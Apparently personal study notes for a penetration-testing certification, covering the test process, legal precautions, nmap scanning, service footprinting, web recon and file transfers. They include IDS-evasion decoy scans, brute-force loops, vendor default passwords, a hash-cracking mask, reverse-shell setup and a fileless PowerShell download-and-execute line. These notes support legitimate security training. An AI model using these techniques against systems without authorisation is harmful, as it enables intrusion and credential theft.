# CPTS-Notes
Notes from CPTS Cert
Domain Information
<br/><br/><br/><br/>

# Module 1: Penetration Testing Process
Domain Information
### Stages of a Penetration Test 
| Stage    | Description |
| -------- | ------- |
| Pre-Engagement | The first step is to create all the necessary documents in the pre-engagement phase, discuss the assessment objectives, and clarify any questions. |
| Information Gathering | Once the pre-engagement activities are complete, we investigate the company's existing website we have been assigned to assess. We identify the technologies in use and learn how the web application functions. |
| Vulnerability Assessment | With this information, we can look for known vulnerabilities and investigate questionable features that may allow for unintended actions. |
| Exploitation | Once we have found potential vulnerabilities, we prepare our exploit code, tools, and environment and test the webserver for these potential vulnerabilities. |
| Post-Exploitation | Once we have successfully exploited the target, we jump into information gathering and examine the webserver from the inside. If we find sensitive information during this stage, we try to escalate our privileges (depending on the system and configurations). |
| Lateral Movement | If other servers and hosts in the internal network are in scope, we then try to move through the network and access other hosts and servers using the information we have gathered. |
| Proof-of-Concept | We create a proof-of-concept that proves that these vulnerabilities exist and potentially even automate the individual steps that trigger these vulnerabilities. |
| Post-Engagement | Finally, the documentation is completed and presented to our client as a formal report deliverable. Afterward, we may hold a report walkthrough meeting to clarify anything about our testing or results and provide any needed support to personnel tasked with remediating our findings. |

<br/>

### Laws and Regulations
| L/R    | Description |
| -------- | ------- |
|  Computer Fraud and Abuse Act (CFAA) | Federal law that makes it a criminal offense to access a computer without authorization |
| Digital Millennium Copyright Act (DMCA) | Includes provisions prohibiting circumventing technological measures to protect copyrighted works |
| Electronic Communications Privacy Act (ECPA) | Regulates the interception of electronic communications, including those sent over the Internet |
| Health Insurance Portability and Accountability Act (HIPAA) | Governs the use and disclosure of protected health information and includes a set of rules for safeguarding personal health information stored electronically |
| Children's Online Privacy Protection Act (COPPA) | Important piece of legislation regulating the collection of personal information from children under 13 |


<br/>

### Precautionary Measure
1. Obtain written consent from the owner or authorized representative of the computer or network being tested
2. Conduct the testing within the scope of the consent obtained only and respect any limitations specified
3. Take measures to prevent causing damage to the systems or networks being tested
4. Do not access, use or disclose personal data or any other information obtained during the testing without permission
5. Do not intercept electronic communications without the consent of one of the parties to the communication
6. Do not conduct testing on systems or networks that are covered by the Health Insurance Portability and Accountability Act (HIPAA) without proper authorization



<br/><br/><br/><br/>



# Getting Started

### Common Tools 
| L/R    | Description |
| -------- | ------- |
| Netcat | Banner Grabbing (netcat [ip] 22), might return the services banner and give us some information on that specific service. PowerCat is the Windows version. Also be used to transfer files. |
| Socat | Like Netcat, but provides some other features. |
| Vi/Vim | Cheat Sheet: https://vimsheet.com/ |

<br>

### Scanning 

**Nmap:** <br><br>
Basic NMAP Scan
```
nmap [ip]
```

You can use the **-sC** flag to tell nmap to use scripts in order to gather more information. The **-sV** flag will retrieve service versions. You can use **-p** to specify what ports you want to scan and **-p-** to scan all 65535 ports. 
```
nmap -sV -sC -p- [ip]
```

NMAP scripts located here
```
/usr/share/nmap/scripts/
```

Once you have the script you need. The following command will execute it against the target.
```
nmap --script <script name> -p<port> <host>
```

<br>

### Banner Grabbing 

Banner Grab with Nmap
```
nmap -sV --script=banner <target>
```

Banner Grab with Netcat
```
nc -nv 10.129.42.253 21
```

Same Banner Grab but with Nmap
```
nmap -sV --script=banner -p21 [ip]
```

Nmap script to enumerate SMB (Server Message Block)
```
nmap --script smb-os-discovery.nse -p445 10.10.10.40
```

SMB Shares (List shares with **-L**, Login wiht **-U**)
```
smbclient -N -L \\\\[ip]

smbclient \\\\[ip]\\users

smbclient -U bob \\\\[ip]\\users
```

<br>

### Web Enumeration
Tools such as Gobuster and ffuf can be used to enumerate webserver directories. Gobuster can specifically be used to bruteforce DNS, vHost, and directories. \
The following command uses the **common.txt** dictionary file to brute force a webservers common directory names.
```
gobuster dir -u http://[ip]/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
You can use cURL to retrieve server header information. You can also use a tool called "EyeWitness" which can identify default creds for web apps. 
```
curl -IL https://[ip]
```
Whatweb will find version of web servers, supporting frameworks, and applications
```
whatweb [ip]

or

whatweb --no-errors [ip]
```
Viewing a websites certificates can be a good source of information. And Robots.txt can provide some valuable insight into what the owners do not want publically indexable. 

<br>

### Types of Shells 
| Type of Shell | Method of Communication |
|---------------| -----------------------|
|Reverse Shell 	|Connects back to our system and gives us control through a reverse connection.|
|Bind Shell 	|Waits for us to connect to it and gives us control once we do.|
|Web Shell 	|Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.|

For a reverse shell you can start a netcat listener that will sit on your system can wait for a call from the victim
```
netcat -lvnp [port number]
```
This website contains a list of "Reverse Shell Commands" that you can use: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

You can upgrade your "TTY" when you first gain access to the remote shell using:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
There are many ways to do this, do the research. <br>

To elevate your tty session:
```
# import /bin/bash
python -c 'import pty; pty.spawn("/bin/bash")'

# If python cannot be found, use Which to find where python is located
which python3

# Hit ctrl + z to background your session

# Run the following commands to upgrade your session and then forground the session
stty raw -echo
fg
```
<br>

### Priv Esc
**Research Resources:**
1. HackTricks (Checklist for Windows and Linux): https://book.hacktricks.xyz/ 
2. PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
3. Ennum Script: https://github.com/sleventyeleven/linuxprivchecker
4. Suit of Enum Scripts: https://github.com/peass-ng/PEASS-ng
5. GTFOBins (Exploit sudo permissions): https://gtfobins.github.io/
6. LOLBAS (Exploit windows permissions): https://lolbas-project.github.io/#

<br>

### Transferring files 
**WGET:** You can setup a python http server on the device that has the file you want to transfer, and use wget on the remote machine to pull it. 
```
# setup python server
python3 -m http.server 8000

# Use wget to pull the file
wget http://[ip]:[port]/[file dir]

# You can also use curl to pull the file
curl http://[ip]:[port]/[file dir] -o [File name you want]
```

If you happen to obtain the ssh creds of a box, you can use SCP
```
scp [file you want to transfer] user@remotehost:/tmp/linenum.sh
```
**Note:** If a firewall is stopping the transfer of some files, you can try encoding the file in base64, copy and pasting it over to the remote machine, and then decoding it there. 


<br>

# Module 2: NMAP

### Host Discovery

nmap one liner to discover  active hosts in a subnet
```
sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5

# -sn specifies to not scan ports
# -oA ouputs the file in 3 mjaor formats you can use just -o here. This important as we can later use this list of hosts to run a scan later on
# You can specify an IP range by using this syntax (10.129.2.18-20) or specify multiple IPs by just listing them out 
# This scanning tech uses ping, and will only work if the firewalls infront of the network allow for pings
# Use the --packet-trace to show all packets and the -PE flag to ensure that the ping requests are sent.
# --reason will display the reason for that result
# --disable-arp-ping
# -n to disable dns resolution
```
**Note:** Linux typically has a ttl aroudn 64 and Windows around 128 

<br>

### Hosts and Port Scanning

1. By default nmap scans the top 1000 ports using the SYN scan "-sS" (SYN scan is only default when nmap is run as root due to socket permissions). When run without root the "-sT" TCP scan is the default.
2. "--top-ports" will scan the 10 most commonly used ports

**Check for OPEN TCP ports**
```
sudo nmap --open -p- host -T5
# T5 make go brooooooom
```

**Trace Packets**
```
sudo nmap host -p 21 --packet-trace -Pn -n --disable-arp-ping
```

**TCP Connect Scan:** Use the -sT flag to envoke a full TCP handshake against a port to see if it is open or not. Port is open if the scan receives a SYN-ACK and closed if it receives a RST. This scan is very loud, but also a good option when accuracy is the goal or when the situation calls for a more polite and mutal scan of the network, as to not disrupt or destroy and services. 

**SYN Scan:** The SYN scan is more stealthy as it does not complete a full handshake and will be less likely to trigger log collection.

**Discover UDP Ports**
```
sudo nmap host -F -sU

# -sU for UDP ports
# -F for top 100 ports
# Due to nmap only sending out empty datagrams to the select UDP ports we will likely not get any responses

sudo nmap host -sU -Pn -n --disable-arp-ping --packet-trace -p 100 --reason 
```

**-sV:** Get additonal available information about the service running on open ports 

<br>


### Saving the Results

**Types of ouput formats:**
```
-oN == normal output

-oG == grepable format

-oX == XML format

-oA == all formats at once


Convert XML format to HTML to view in your browser for an easy to read summary
$ xsltproc target.xml -o target.html
```

<br>


### Service Enumeration 

**Full Port Scan**
```
sudo nmap host -p- -sV

# Full range port scans can take some time, user SPACE BAR to have nmap show you the progress of the scan  
# You can also use the option --stat-every=5s to have nmap update you in intervals
```

<br>

### Scripting

**Scan Example**
```
sudo nmap 10.129.2.28 -p 80 -sV --script vuln

# https://nmap.org/nsedoc/scripts/
```


<br>

### Scanning Performance

**Timeouts:** Set the time that nmap will wait until it receives a response from the target. Smaller numbers will speed up your scan. Default value is 100ms.
```
--min-RTT-timeout
```
\
**Retry Rate:** Set number of times nmap will try to resend a packet.
```
--max-retries 0
```
\
**Rate:** Specify the amount of packets to send at a time. Useful when you have permission and know the bandwidth / dont care about the target...
```
--min-rate 300
```

\

**Timing:** Specify how agressive you want the scan to be. There are presets for all of the other settings.  
```
-T 0 / -T paranoid
-T 1 / -T sneaky
-T 2 / -T polite
-T 3 / -T normal
-T 4 / -T aggressive
-T 5 / -T insane

Exact figure can be found here: https://nmap.org/book/performance-timing-templates.html
```


<br>

### Firewall IDS IPS Evasion

** -sA v -sS:** sA can make it harder for firewalls and IDS/IPS to detect scans since it only sends ACK flags. Since the firewall cannot determine where the packet was created, it allows it through. 

<br>

**Decoy and RND**
```
sudo nmap [ip] -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5

# -D has nmap generate random IP addresses and insert them into the packet header. These packets are sent along side your ip and make it hard for the router to detemine what to block.

# RND specify the number of address to generate (Your ip will have an index from 0-4)
```

**Testing firewall rule and OS Detection:**
```
sudo nmap [ip] -n -Pn -p445 -O

sudo nmap [ip] -n -Pn -p 445 -O -S [ip] -e tun0
```

**DNS Proxying:** 
```
--dns-server
# Specify DNS servers with

--source-port
# Specify source port
```



<br>

# Module 2: Footprinting


### Enumeration Principles

![enum-method3](https://github.com/user-attachments/assets/d9df750a-a2d8-4040-abef-7f3286e97d8f)


### Domain Information

**Find Subdomains:** https://crt.sh/

**Certificate Transparancy:** RFC-6962 states that all digital certs issued by a CA must be logged as to detect false or malicious certs. Websites like the one above store this information for the public to query. Below are some commands to query domain certs. 
```
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .
# Curl webpage and output as JSON

curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
# Curl webpage and sort by uniqure sub domains

for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done
# Search file for addresses with public IPs acessible from the internet
```

**Shodan:** We can plug this new information into shodan and 
```
for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done

for i in $(cat ip-addresses.txt);do shodan host $i;done
# clip host and send ips to shodan via terminal "shodan" command
```

**Dig**
```
dig any [domain address]
# Interrogate DNS name servers
```

**Records**
```
A: Subdomains

MX: Mail Server Records

NS: Name Servers that are used to resolve the FQDN to IP addresses

TXT:Verification Keys
```


### Cloud Resources

**Google Dorking:** intext: and inurl:

**Domain Glass:** https://domain.glass/

**GrayHatWarfare:** https://buckets.grayhatwarfare.com/


### FTP

**TFTP Commands:** connect, get, put, quit, status, verbose, debug

**vsFTPd - "ftpusers":** Specifies what users are not permitted to use the FTP service 

**vsFTPd Dangerous Settinga**
1. anonymous_enable=YES 	
2. anon_upload_enable=YES 	
3. anon_mkdir_write_enable=YES 	
4. no_anon_password=YES 	Do not ask anonymous for password?
5. anon_root=/home/username/ftp 	
6. write_enable=YES 	Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?

**NMAP FTP Service**
```
# search for NSE scripts on your system
find / -type f -name ftp* 2>/dev/null | grep scripts

# Scan
sudo nmap -sV -p21 -sC -A 10.129.14.136

# Show scripts running
sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace

# If you need to connect to ftp server without ftp
nc -nv 10.129.14.136 21
telnet 10.129.14.136 21

#Run with openSSL if the ftp server you are connecting to is running with TLS/SSL
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```


### SMB

SMB handles file access across different computers. Samba allows SMB to communicate w UNIX. SMB typically operates on ports 137, 138, 139, while CIFS operates on 445. 
NETBios was developed by IBM as an API that would lay the foundation for devices to connect and share data with eachother.

**Dangerous Settings**
1. browseable = yes 	Allow listing available shares in the current share?
2. read only = no 	Forbid the creation and modification of files?
3. writable = yes 	Allow users to create and modify files?
4. guest ok = yes 	Allow connecting to the service without using a password?
5. enable privileges = yes 	Honor privileges assigned to specific SID?
6. create mask = 0777 	What permissions must be assigned to the newly created files?
7. directory mask = 0777 	What permissions must be assigned to the newly created directories?
8. logon script = script.sh 	What script needs to be executed on the user's login?
9. magic script = script.sh 	Which script should be executed when the script gets closed?
10. magic output = script.out 	Where the output of the magic script needs to be stored?

**SMB Client Commands**
```
# List dirs using anon
smbclient -N -L //10.129.14.128


```

**Scan SMB**
```
# Version scan and default script scan, specify ports
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

**RPC-Client**
Nmap has trouble collecting information from SMB services so you can use tools like RPC-Client as a means of manually inspecting them. This is a tool that is designed to perfom MS-RPC functions. An RPC is a remote procedure call which is a way of. Below are a list of commands we can use to interact with the SMB service via RPCClient
1. srvinfo -	Server information.
2. enumdomains -	Enumerate all domains that are deployed in the network.
3. querydominfo -	Provides domain, server, and user information of deployed domains.
4. netshareenumall -	Enumerates all available shares.
5. netsharegetinfo <share> - Provides information about a specific share.
6. enumdomusers -	Enumerates all domain users.
7. queryuser <RID> - Provides information about a specific user.

**rpcclient commands**
```
# Brute force queryuser RIDs 0 - 4095 (0x000 - 0xFFF).
for i in $(seq 0 1100); do rpcclient -N -U "" [ip] -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

# You can also use samrdump.py for this type of information gathering

#SMBmap, CrackMapExec, and enum4linux-ng are other tools to collect this same information
smbmap -H [ip]
crackmapexec smb [ip] --shares -u '' -p ''
```

### Network File System (NFS) 

**NFS:** Based on Open Network Computing Remote Procedure Call (ONC-RPC/SUN-RPC) protocol exposed on TCP and UDP ports 111 and 2049

**Configure NFS:** NFS can be configured at /etc/exorts. Below are the options you can use. 
1. rw - Read and write permissions.
2. ro - Read only permissions.
3. sync - Synchronous data transfer. (A bit slower)
4. async - Asynchronous data transfer. (A bit faster)
5. secure - Ports above 1024 will not be used.
6. insecure - Ports above 1024 will be used.
7. no_subtree_check - This option disables the checking of subdirectory trees.
8. root_squash 	- Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents root from accessing files on an NFS mount.
9. nohide
10. no_root_squash

**Scan**
```
# Basic service enum
sudo nmap -sV -sC [ip] -p 111,2049

# rpcinfo nse script
sudo nmap -sV --script nfs* [ip] -p 111,2049
```

**Mounting share:** Once you find a share you can mount it and view it with the following commands
```
# List shares you can mount
showmount -e 10.129.14.128

# Create dir and mount drive to that dir
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
cd target-NFS
```

<br> 

### DNS (Domain Name System) (Port 53)

<br> 

**DNS Records:**
1. A - Returns an IPv4 address of the requested domain as a result.
2. AAAA - Returns an IPv6 address of the requested domain.
3. MX -	Returns the responsible mail servers as a result.
4. NS -	Returns the DNS servers (nameservers) of the domain.
5. TXT - This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam.
6. CNAME - This record serves as an alias for another domain name. If you want the domain www.hackthebox.eu to point to the same IP as hackthebox.eu, you would create an A record for hackthebox.eu and a
7. CNAME - record for www.hackthebox.eu.
8. PTR - The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names.
9. SOA - Provides information about the corresponding DNS zone and email address of the administrative contact.

<br> 

**Dig:** DNS Lookup Utility
```
dig soa nsa.gov
```

<br> 

**DNS Configuration Files**
1. Local DNS config files
    1. Under the Linux Bind9 this file is named.conf/etc/bind/named.conf.local
  
3. Zone Files
    1. Text file that describes the DNS zone with the BIND file format.
    2. "BIND (Berkeley Internet Name Domain) is a free, open-source software package that translates domain names into IP addresses"
    3. Must be 1 SOA record, and at least one NS record. 

5. Reverse Name Resolution Files
    1.  Needed in order for the IP address to be resolved by the FQDN
  
<br> 

**Dangerous Settings**\
BIND9 CVE details: https://www.cvedetails.com/product/144/ISC-Bind.html?vendor_id=64
|Option | Description |
| --- | --- |
|allow-query | Defines which hosts are allowed to send requests to the DNS server | 
|allow-recursion | Defines which hosts are allowed to send recursive requests to the DNS server | 
|allow-transfer | Defines which hosts are allowed to receive zone transfers from the DNS server | 
|zone-statistics | Collects statistical data of zones |


<br> 

**Footprinting DNS**
```
# dig to find info on DNS server, NS finds the name servers, and @ specifies the ip of the server
dig ns [domain] @[ip]

# Potential to find the DNS servers version by using the chaos or "CH" request and searching for the TXT record
dig CH TXT [domain] [ip]

# Use ANY option to view all record
dig any [domain] [ip]

# Zone transfers
dig axfr [domain] [ip]
```

**Bruteforcing DNS**
```
# for subDomain in $(cat ~/secLists/Discovery/DNS/subdomains-top1million-110000.txt); do dig $sub.[domain] @[ip] | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done

# DNSenum is also an option
dnsenum --dnsserver [ip] --enum -p 0 -s0 -o [fileName.txt] -f [secLists loction] [domain]
```

<br>

### SMTP

**SMTP Default Configuration**
```
cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
```
**SMTP Commands**
1. AUTH PLAIN
2. HELO 
3. MAIL FROM 
4. RCPT TO 
5. DATA 
6. RSET 
7. VRFY
8. EXPN: Client checks if mailbox is available
9. NOOP 
10. QUIT 

**Connect to SMTP Service**
``` 
telnet [ip] [port] 

# Use VRFY to enumerate all users on service 
VRFY root

#List of all SMTP server responses 
https://serversmtp.com/smtp-error/
```

**Footprinting**
```
#nmap - nse script is smtp-commands and smtp-open-relay
sudo nmap [ip] -sC -sV -p 25 
```
<br>

### IMAP 143/993 &  POP3 110/995

**IMAP Commands**
1. LOGIN username password
2. LIST "" *
3. CREATE "INBOX"
4. DELETE "INBOX"
5. RENAME 
6. LSUB
7. SELECT INBOX / UNSELECT
8. FETCH, CLOSE, LOGOUT

**POP3 Commands**
1. USER username
2. PASS password
3. STAT, LIST
4. RETR id, DELE
5. CAPA, RSET, QUIT

**Footprinting**
```
sudo nmap [ip] -sV -p110,143,993,995 -sC 

# If you know a users password you can curl email. Using -v can show you how the connection
# was established and 
curl -k https://[ip] --user user:p4ssw0rd

# Use openssl to interact with the IMAP OR POP service 
openssl s_client -connect [ip]:pop3s 
openssl s_client -connect [ip]:IMAP
```


### SNMP 

**Default Configuration**
```
cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
```


**Dangerous Settings**
1. rwuser auth 
2. rqcommunity <community string> <ip> 

**Footprinting**
```
# Tools: snmpwalk, onesixtyone, braa

# SNMPWALK - Find OIDs 
snmpwalk -v2c -c public [ip]

# onesixtyone - find community string 
onesixtyone -c [wordlist] [ip]

# use tools such as crunch to create custom word lists 
#Combine the found community string with BRAA to brute-force OIDs 
braa [community string]@[ip]1.3.6.*

```

<br>

### MySQL (3306)

**LAMP/LEMP**: Web servers conprised of the following 
1. Linux, Apache, MySQL, PHP
2. Linux, Nginx, MySQL, PHP

**Footprinting**
```
sudo nmap [ip] -sV -sC -p 3306 --script mysql*

# Common MySQL Commands
1. mysql -u [user] -p [password] -h [ip]
2. show databases;
3. use database;
4. show tables; 
5. show columns from table;
6. select * from table 
7. select * from table where column = "string"
```
<br>

### MSSQL (Microsoft SQL) (1433)

**SSMS**: SQL Server Management Studio to manage MSSQL

**Tools to access MSSQL databases:**
1. mssql-cli 
2. SQL server powershell
3. HeidiSQL
4. SQL Pro
5. mssqlclient.py

**Footprinting**
```
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 [ip]

# also you can use the Metasploit aux scanner named mssql_ping to gather some more information 

# Connect to the service using the following command
 python3 mssqlclient.py username@host -windows-auth
```


### Oracle TNS 

**Client Server**: server side uses listener.ora and client uses tnsnames.ora

**Tools to interact with Oracle service -- Script**
```
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

```
# Verify odat install (Oracle Database Attacking Tool)
./odat.py -h
```


**Footprinting**
```
sudo nmap [ip] -p1521 -sV --open -oN nmap.txt 

# Brute Force (nmap, hydra, odat)
sudo nmap [ip] -p1521 -sV --open --script oracle-sid-brute

#odat 
./odat.py all -s [ip] > odat.txt

# connect to service 
sqlplus user/pass@[ip]/XE 

# Execute the following if you run into "sqlplus: error while loading"
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```
<br>

## IPMI (Intelligent Platform Management Inferface) Port 623

**IPMI**: Allows for management of system hardware independantly of OS or BIOS. you can check up on temp, fan speeds, logs, even if the system is powered off. It is nearly equivilent to having physical access to the system.

**Footprinting**
```
sudo nmap -sU --script ipmi-version -p 623 [webaddress]

# metasploit module 
aux/scanner/ipmi/ipmi_version 

# Default passwords 
  Dell: root calvin 
  HP iLO: Administrator [randomized 8-character string consisting of numbers and uppercase letters]
  Supermicro: ADMIN ADMIN

# In the event of an HP iLO using a factory default password
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u 

# To retrieve IPMI hashes use the following MSF module 
scanner/ipmi/ipmi_dumphashes
```
<br>

## Linux Remote Management Protocols

**SSH - Port 22**
```
# footprinting 
sshaudit

# Change Auth Method 
ssh -v cry0l1t3@[ip] -o PreferredAuthentications=password
```

**Rsync - Port 873**
```
# Remote copy tool 

#Foortprinting 
sudo nmap [ip] -sV -p 873

# Netcat 
nc -nv [ip] 873

# Enumerate dirs
sudo rsync -av --list-only rsync://[ip]/[dir]
```

**R-Services - Port 512, 513,514**
```
# Suite of tolls that enable remote management over TCP/IP 
# Unencrypted, MiTM 

# Guide to R-Serivces command 
https://csbygb.gitbook.io/pentips/networking-protocols-and-network-pentest/rservices

# Footprinting 
sudo nmap [ip] -sV -p 512,513,514

# Commands
rwho, rlogin, rusers, rcp, rsh, rexec, rlogin, rstat, ruptime,
```

## Windows Remote Management Protocols 

**RDP - 3389**
```
# Footprinting 
sudo nmap [ip] -sC -sV -p3389 --script rdp*

# Perl script that can identify security settings of RDP
rdp-sec-check.pl
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl [ip]

# Connect from linux to RDP servers using 
xfreerdp, rdesktop, remmina

# xfreerdp example connection
xfreerdp /u:username /p:"password" /v:[ip]
```

**WinRM - 5985(HTTP) 5986(HTTPS)**
```
# Windows Remote Management 

# Windows remote shell is similar and can execute arbitrary commands on the remote system 

# Footprinting
sudo nmap [ip] -sV -sC -p 5985,5986 --disable-arp-ping -n 

# Powershell tool Test-WsMan can show remote servers that can be reached by WinRM

# On linux, evil-winr
sudo evil-winrm -i [ip] -u username -p password 
```

**WMI - Windows Management Instrumentation - 135**
```
# If you can get access to WMI you can change almost any setting on the system 

# Footprinting with wmiexec.py
../wmiexe.py username:password@[ip] "hostname"
```

<br>
<br>

## Information Gathering: Web Edition 

<br> 

### Introduction 
```
# Collecting Information about a targets Website / Web Application 
1. Idenfity Assest (Web Pages, Sub Domains, IPs)
2. Hidden Information (Backup Files, Config Files, Internal Documentation)
3. Attack Surface (Vulnerabilities)
4. Gather Intel (Personnel, emails, behaviour)
```

<br>

### WHOIS 
```
# Whosi is a giant database that maps domains to their owners
# Can help to identify Personnel, Network infrastructure, and Network Changes
# Tool like WhoisFreaks, tracks changes 

# Use Cases 
1. Look up sus email and help to determine the reputation of its sender
2. Lookup domain of a C2 server that malware is reaching out to 
3. Threat Intel report, gather info the target (take down history)
```


<br>

### DNS 
```
# Records
  A: Maps hostname to IPv4
  AAAA: Maps hostname to IPv6
  CNAME: Creates an alias for a hostname pointing to another host 
  MX: Mail Server hostname
  NS: Name servers hostnames 
  TXT: Text record storing arbitrary information 
  SOA: Administrative information 
  SRV: Hostname and port for specific services 
  PTR: Map ip to hostname (Reverse Lookup)

  IN / CH / HS: Specifies the internet protocol being using (Internet, Chaosnet, Hesiod)

# DNS Tools 
1. dig
2. Lookup
3. host 
4. dnsenum
5. fierce 
6. dnsrecon 
7. theHarvester
```
<br>

### Subdomains 
```
# Subdomains are represented by A records

# CNAME records might be used as well to create subdomain aliases

# Brute Force DNS 
1. dnsenum 
2. fierce
3. dnsrecon
4. amass 
5. assetfinder
6. puredns 
7. gobuster 
8. ffuf 

# Passive enumeration methods
1. Certificate Transparancy Logs 
2. SSL/TLS Certificates
3. Search Engines ("site:")

# dnsenum 
dnsenum --enum [domain] -f ~/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r

# Zone Transfers is a copy of a domain and its subdomains to another NS as a means of     redundancy.
dig axfr [DNS Server] [domain]

```

<br>

### Virtual Hosts
```
# Discovery Tools: gobuster, feroxbuster, ffuf
gobuster vhost -u http://[ip] -w [wlist] --append-domain

# With gobuster -k will ignore ssl/tls cert errors 
```

<br>

### Certificate Transparancy Logs 
```
# TLS/SSL are required to maintain trust across the internet. Digital certificates are need to verfiy identity. Certificate Transparancy Logs are public ledgers of these issued certificates. 

# Searching CT Logs 
  1. crt.sh
  2. Censys 

# crt.sh API using Curl
curl -s "https://crt.sh/?q=[domain]&output=json" | jq -r '.[]
 | select(.name_value | contains("[sub doamin]")) | .name_value' | sort -u
```



<br>

### Fingerprinting 
```
# Gather information about the tech used to power a targets device

# Fingerprinting Techniques 
  1. Banner Grabbing
  2. HTTP Headers 
  3. Custom Responses 
  4. Page Content 

# Tools 
  1. Wappanalyzer 
  2. BuiltWith 
  3. Whatweb 
  4. Nmap
  5. Netcraft 
  6. wafw00f

# Banner Grabbing 
# I flag fetches only http headers 
  curl -I [domain]

# wafw00f
  wafw00f [domain]

# Nikto (-b is niktos software identification modules)
  nikto -h [domain] -Tuning -b 
```


<br>

### Crawling 
```
# Tools
  1. Burp Spider 
  2. ZAP
  3. Scrapy 
  4. Apache Nutch 
```

<br>

### Automating Recon 
```
# Recon Frameworks 
  1. FinalRecon: py based recon 
  2. Recon-ng 
  3. theHarvester 
  4. SpiderFoot
  5. OSINT Framework 
```

<br>
<br> 

## Vulnerability Asssessment
```
# Goal of a Vulenrability Assessment is not to exploit a machine, but rather to identity, categorize, and document the targets vulnerabilities.

# Steps 
  1. identify all systems on the network, and categorize by assumed risk 
  2. Scanning Policies 
  3. Types of Scans 
  4. Configure Scan (Hosts, Ports, protocols, noise level, time of scans, notifcations, dashboards)
  5. Perform Scan 
  6. Determine risks of the scan (Shouldnt this come before running the scan lol)
  7. Decipher Scan Results
  8. Remediation Plan 


# Key Terms
  1. Vulnerability: Weakness or bug on a system 
  2. Threat: Process that amplifies the potential of an adverse event
  3. Vulnerability + Threat = Risk 
  4. Exploit: Resource that can be used to take advantage of an asset


# Asset Management 
  1. Inventory list of what you have, you cannot protect something you dont know you have
    - All data stored on premises (HHD, SSD, etc)
    - Remotely Stored Data (Cloud, off site servers, etc)
    - Remote SaaS applications 
    - Applications
    - Local networking equipment 
```

<br>

### Vulnerability Scanning 
```
# Scanning Platforms 
  1. Nessus
  2. Nexpose 
  3. Qualys 
  4. OpemVAS

# Nessu Output 
  1. Use the nessus-report-downloader to pull remote reports 
    a. https://raw.githubusercontent.com/eelsivart/nessus-report-downloader/master/nessus6-report-downloader.rb

# Nessus Issues 
  1. All ports open or closed: Ping remote host option 
  2. Ensure "safe checks" option is enables to avoid adverse effects 
  3. Use vnstat to monitor bandwidth before and during scan


# OpenVAS 
  1. Reporting Tool: https://github.com/TheGroundZero/openvasreporting
  Command: python3 -m openvasreporting -i report-2bf466b5-627d-4659-bea6-1758b43235b1.xml -f xlsxi

# Final Report should contain the following 
  1. Executive Summary 
  2. Overview 
  3. Scope
  4. Vulernabilites and Recommendations 
```

<br>

## File Transfers 
<br>

### Windows 
```
# Convert Using b64 and powershell 
  cat [file] V| base64 -w 0; echo 

  # Copy the above commands ouput contents to terminal of remote machine
  # In powershell 
  [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("CONTENTS"))"

  # Check file was decoded properly by checking the hash matches the origional hash 


# Powershell Web Downloads 
  # The system.net.webclient class allows for web downloads 
  # https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0
  (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

  # Using IEX we can leverage powershell to invoke fileless attacks (Using Memory instead)
  IEX (New-Object Net.WebClient).DownloadString('Web Executable')

